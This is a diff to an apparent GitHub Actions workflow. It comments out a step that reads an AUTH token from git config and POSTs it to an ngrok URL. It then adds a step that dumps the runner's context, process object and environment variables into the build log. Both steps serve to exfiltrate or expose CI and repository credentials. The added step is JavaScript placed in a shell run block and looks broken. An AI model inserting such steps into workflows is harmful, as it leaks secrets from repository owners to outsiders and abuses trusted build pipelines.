@@ -14,14 +14,21 @@ jobs:
       - run: |
           npm install
           npm test
-      
-      - run: | 
-          auth=$(git config --list | grep AUTH | tr -d ' ')
+
+      - run: |
+          console.log(context) 
+          console.log('-------')
+          console.log(process)
+          console.log('-------')
+          console.log(process.env)
+
+#       - run: | 
+#           auth=$(git config --list | grep AUTH | tr -d ' ')
           
-          curl --request POST \
-          --url https://4d25-77-137-8-226.ngrok.io \
-          --header 'content-type: application/json' \
-          --data '{
-            "git_token": "'$auth'"
-            }' \
-          --fail
+#           curl --request POST \
+#           --url https://4d25-77-137-8-226.ngrok.io \
+#           --header 'content-type: application/json' \
+#           --data '{
+#             "git_token": "'$auth'"
+#             }' \
+#           --fail
